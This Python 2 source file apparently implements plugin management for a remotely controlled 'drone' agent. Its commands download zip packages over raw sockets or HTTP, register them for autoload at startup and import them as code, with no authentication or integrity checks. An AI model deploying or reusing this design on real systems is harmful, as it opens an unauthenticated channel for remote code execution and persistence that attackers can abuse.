# -*- coding: iso-8859-1 -*-
from __future__ import with_statement
import sys
import os
import re
import socket
import httplib
import common

def find_plugin_index(plug_list,name):
    for j in range(0,len(plug_list)):
	if plug_list[j].__name__==name: return j
    else:
	return None
	
def stop_plugin(C,plug_name):
    i=find_plugin_index(common.plugins,plug_name)
    if not i is None:
	# Chiama .when_removed se esiste con parametro C
	if 'when_removed' in dir(common.plugins[i]): common.plugins[i].when_removed(C)
	del common.plugins[i]
	C.send_ok('Plugin ['+plug_name+'] Successfully Stopped.')
    else:
	C.send_error('Stopping: No Such Plugin.')
	
def anyloaded_from_package(pack_name):
    if not pack_name[-4:]=='.zip': pack_name+='.zip'
    for j in range(0,len(common.plugins)):
      if common.plugins[j].package==pack_name: return True
    else:
      return False

def modify_autoload(p_name,**args): # typ=pack|plug action=del|add 
    if not 'typ' in args.keys() or not 'action' in args.keys(): return False
    lines=[]
    with open(common.plugs_file,"r") as fd: lines=fd.readlines()
    if args['typ']=='pack':
	if p_name.find('.zip')==-1: p_name+='.zip'
	s='P:'+common.drone_dir+p_name+'\r\n'
    else: s=p_name+"\r\n"
    if args['action']=='add':
	lines.append(s)
    elif args['action']=='del':
	try:
	    lines.remove(s)
	except ValueError:
	    return False
    else:
	return False
    with open(common.plugs_file,"w") as fd: fd.writelines(lines)
    return True
    
def handle_command(C,cmd):
# TODO: PALABRA LLAVE...TEST TEST TEST...TEST DE UPLOAD_PACK_HTTP
    (func,args)=common.extract_funcargstuple(cmd)
    if func=='INFO':
	C.send("Plugin dedicato alla gestione e mantenimento degli altri plugin, le funzioni sono:\n")
	C.send("#UPLOAD_PACK $pack_name#str $bytes_len#int $remote#bool $remote_ip#ip $connection_port#int\n")
	C.send("Funzione che salva un pacchetto nella directory corrente del drone, che verrà scaricato collegandosi\n")
	C.send("a remoto o bindando a una porta locale nel qual caso il remote_ip verrà ignorato). Tale funzione non\n")
	C.send("aggiunge nessun plugin fra la lista dei plugin automaticamente caricati all'avvio del drone, ne lo lancia\n")
	C.send("subito dopo il download; ma si limita ad aggiornare il path corrente e futuri (attraverso l'auto-load).\n")
	C.send("Il parametro pack_name deve essere senza estensione .zip.\n")
	C.send("#UPLOAD_PACK_HTTP $http_location#str\n")
	C.send("Scarica un pacchetto da un indirizzo http, sono lasciate libere le eccezioni per ridurre al minimo il controllo sulla libreria\n")
	C.send('esterna utilizzata (httplib). Ex http_location: "http://www.my.location.org/pack.zip"\n')
	C.send("#START $plugin_name#str\n")
	C.send("Carica un plugin che si trova nel PATH di python (o nella stessa cartella del drone, dove solitamente sono posti i plugin).\n")
	C.send("#STOP $plugin_name#str\n")
	C.send("Toglie il plugin, non permanentemente, al prossimo avvio di drone o con START si ricaricherà.\n")
	C.send("#ADD_AUTOLOAD $plugin_name#str\n")
	C.send("Aggiunge il plugin nella lista di caricamento automatico.\n")
	C.send("#SHOW_AUTOLOAD\n")
	C.send("Dump del file di caricamento automatico.\n")
	C.send("#DEL_AUTOLOAD $plugin_name#str\n")
	C.send("Toglie il plugin dalla lista di caricamento automatico.\n")
	C.send("#DELETE_PACK $pack_name#str\n")
	C.send("Elimina il pacchetto dal PATH; la funzione fallirà se ci sono plugin di quel pacchetto attualmente in esecuzione.\r\n")
	return True
    elif func=='UPLOAD_PACK':
		if not args:
		    C.send_error('Invalid Arguments.')
		parse=re.match('^"([0-9a-zA-Z_\.]+)" ([0-9]+) ([01]) ([0-9\.]+) ([0-9]+)$',args)
		if not parse:
		    C.send_error('Invalid Arguments.')
		else:
		    arg_p=(parse.group(1),int(parse.group(2)),parse.group(3),parse.group(4),int(parse.group(5)))
		    sox=socket.socket()
		    filename=''
		    # TODO: TEST
		    try:
		    	if arg_p[2]=='1': # REMOTE
			    C.send('Connecting to %s:%d...\n' % (arg_p[3],arg_p[4]))
			    sox.connect(arg_p[3:])
			    s=sox
			else: # LOCAL
			    sox.bind(('',arg_p[4]))
			    sox.listen(1)
			    C.send('Listening on %s:%d...' % ('INADDR_ANY',arg_p[4]))
			    sox.settimeout(20)
			    s=sox.accept()[0]
		        s.settimeout(20)
		        C.send('Connection Established\n')
		        if arg_p[0].find('.zip')==-1: filename=arg_p[0]+'.zip'
		        else: filename=arg_p[0]				  	
		        # Sovrascrive se già esistente: OTTIMA COSA per PLUGIN DANNEGGIATI O DA AGGIORNARE	
		        fd=open(filename,"wb") # name+type
		        left=arg_p[1]
		        while left: # 256 bytes blocks
			        if left<256: block=left
			    	else: block=256
			    	data=s.recv(block,socket.MSG_WAITALL)
		    		if data=='': raise IOError
		    		fd.write(data)
			    	left-=block
		    except (socket.error,IOError):
		        C.send_error('Unexpected Error')
		        os.unlink(filename)
		        return True
		    finally:
		        s.close()
		        if arg_p[2]=='0': sox.close() #LOCAL
		        fd.close()
                    C.send_ok('Package ['+filename+'] Succesfully Downloaded.')
		    modify_autoload(filename,typ='pack',action='add')
		    common.unzip_dynamic(common.drone_dir+filename)
		    sys.path.append(common.drone_dir+filename)
		return True
    elif func=='UPLOAD_PACK_HTTP':
    	if not args:
	    C.send_error('No Address Specified.')
	    return True
	args.strip('"')
	ex=re.match('^http://([^/]+)(/.+)$',args)
	if not ex:
	    C.send_error('Malformed URI.')
	    return True
	c=httplib.HTTPConnection(ex.group(1))
	C.send('Connecting... ')
	c.connect()
	C.send('Connection Established. ')
	c.putrequest('GET',ex.group(2))
	c.endheaders()
	C.send('Initiating Transfer...\n')
	r=c.getresponse()
	if r.status==404:
	    C.send_error("File doesn't Exists on Remote Server.")
	    return True
	filename=re.match('.+\/([^\/]+)$',args).group(1)
	if not filename[-4:]=='.zip': filename+='.zip'
	fd=open(filename,"wb")
	fd.write(r.read())
	c.close()
	fd.close()
	C.send_ok('Package ['+filename+'] Succesfully Downloaded.')
	modify_autoload(filename,typ='pack',action='add')
	common.unzip_dynamic(common.drone_dir+filename)
	sys.path.append(common.drone_dir+filename)
	return True
    elif func=='STOP':
	stop_plugin(C,args)
	return True
    elif func=='DELETE_PACK': # receives args between ""
	args=args.strip('"')
	if args.find('.zip')==-1: args+='.zip'
	if anyloaded_from_package(args):
	    C.send_error('Package ['+args+'] Contains Plugins that are Running.')
	else:
	    modify_autoload(args,typ='pack',action='del')
	    for fl in os.listdir(common.drone_dir):
		if fl==args: os.unlink(common.drone_dir+fl)
	    C.send_ok('Successfully Deleted Pack ['+args+'].')
	return True
    elif func=='START':
	i=find_plugin_index(common.plugins,args)
	if i is None:
	    try:
		common.plugins.append(__import__(args))
		if not "handle_command" in dir(common.plugins[len(common.plugins)-1]): 
		    del common.plugins[len(common.plugins)-1]
		    C.send_error('Specified Plugin do not seems to be Valid.')
		    return True
	    except ImportError:
                C.send_error('Error Loading [%s].' % args)
	    else:
		cur=len(common.plugins)-1
		x=re.match('^.+/([^\.]+\.zip)/[^/]+$',common.plugins[cur].__file__)
		if x: common.plugins[cur].package=x.group(1)
		else: common.plugins[cur].package='*NP*'
		C.send_warning('For the Drone to Follow the Changes of an Altered Plugin is Necessary to Restart de Drone.')
		C.send_ok('Plugin ['+args+'] Successfully Started.')
	else: # If yet present
	    C.send_error('Specified Plugin Seems to be Running.')
	return True
    elif func=="ADD_AUTOLOAD":
	modify_autoload(args,typ='plug',action='add')
	C.send_ok('Plugin ['+args+'] Put in Auto-Load File.')
	return True
    elif func=="DEL_AUTOLOAD":
	if modify_autoload(args,typ='plug',action='del'):
	    C.send_ok('Plugin ['+args+'] Removed from Auto-Load File.')
	else:
	    C.send_error('Plugin ['+args+'] Is not Present in the Auto-Load File.')
	return True
    elif func=="SHOW_AUTOLOAD":
	with open(common.plugs_file,"r") as fd:
	  for line in fd.readlines():
	    C.send(line)
	return True
    else:
	return False
